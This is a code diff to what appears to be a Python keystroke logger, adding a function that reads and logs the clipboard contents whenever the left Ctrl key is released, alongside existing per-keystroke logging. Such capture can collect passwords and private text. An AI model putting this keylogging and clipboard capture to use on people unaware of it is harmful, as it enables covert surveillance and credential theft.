@@ -8,8 +8,9 @@
 # ========== Importing Modules ==========
 import os
 from pynput import keyboard, mouse
+import pyperclip
 import pyautogui
-from utils.writeLog import writeLog
+from utils.writeLog import writeLog, writeAppLog
 import time
 
 # ========== On Press Function ==========
@@ -27,6 +28,20 @@ def onPress(key):
             key = key
 
         writeLog(key)
+        
+# ========= On Paste Function ==========
+def onPaste(key):
+    try:
+        if key == keyboard.Key.ctrl_l:
+            clipboard_text = pyperclip.paste()
+            writeLog(f'Pasted: {clipboard_text}\n')
+    except Exception as e:
+        writeAppLog(f'Error while pasting: {e}')
+
+# ========== Function to record clipboard ==========
+def recordClipboard():
+    with keyboard.Listener(on_release=onPaste) as listener:
+        listener.join()
 
 # ========== Function to record keystrokes ==========
 def recordKeyStrokes():
